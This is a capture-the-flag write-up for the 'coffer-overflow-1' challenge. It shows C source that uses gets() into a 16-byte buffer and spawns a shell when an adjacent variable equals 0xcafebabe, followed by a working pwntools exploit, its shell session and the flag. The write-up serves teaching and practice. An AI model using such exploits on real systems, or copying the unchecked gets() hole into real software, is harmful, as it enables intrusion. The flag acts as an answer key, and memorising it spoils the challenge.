# coffer-overflow-1

Author: [roerohan](https://github.com/roerohan)

This is a simple buffer overflow challenge.

# Requirements

- Basic Buffer overflow.

# Source

- [coffer-overflow-1](./coffer-overflow-1).

```
The coffers keep getting stronger! You'll need to use the source, Luke.

nc 2020.redpwnc.tf 31255
```

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);

  if(code == 0xcafebabe) {
    system("/bin/sh");
  }
}
```

# Exploitation

Check out [coffer-overflow-0](../coffer-overflow-0) for some details. You can checkout how buffer overflow works [here](https://github.com/csivitu/Incore-Sessions/blob/master/Buffer%20Overflow/Session-1.md).
<br />

We see in the code snippet that `name` is alloted 16 bytes, and `code` is alloted 8 bytes (long, 64-bit). Also, the `gets()` function is used, which does not check the size of the input. So, we can simply write past the space alloted for `name` and write into `code`, the value `0xcafebabe` in little endian.
<br />

We can use `pwntools` for the same. As discussed in `coffer-overflow-0`, this function will take up 32 bytes in the stack. The last 8 will store `code`, so we can write 24 random characters followed by `0xcafebabe` in little endian.

```python
import pwn

r = pwn.remote('2020.redpwnc.tf', 31255)

rep = b'a'*24 + pwn.p64(0xcafebabe)
print(rep)
r.sendline(rep)
r.interactive()
```

Run this program using `python`.

```bash
$ python cof1.py 
[+] Opening connection to 2020.redpwnc.tf on port 31255: Done
b'aaaaaaaaaaaaaaaaaaaaaaaa\xbe\xba\xfe\xca\x00\x00\x00\x00'
[*] Switching to interactive mode
Welcome to coffer overflow, where our coffers are overfilling with bytes ;)
What do you want to fill your coffer with?
$ ls
Makefile
bin
coffer-overflow-1
coffer-overflow-1.c
dev
flag.txt
lib
lib32
lib64
$ cat flag.txt
flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}
```

The flag is:

```
flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}
```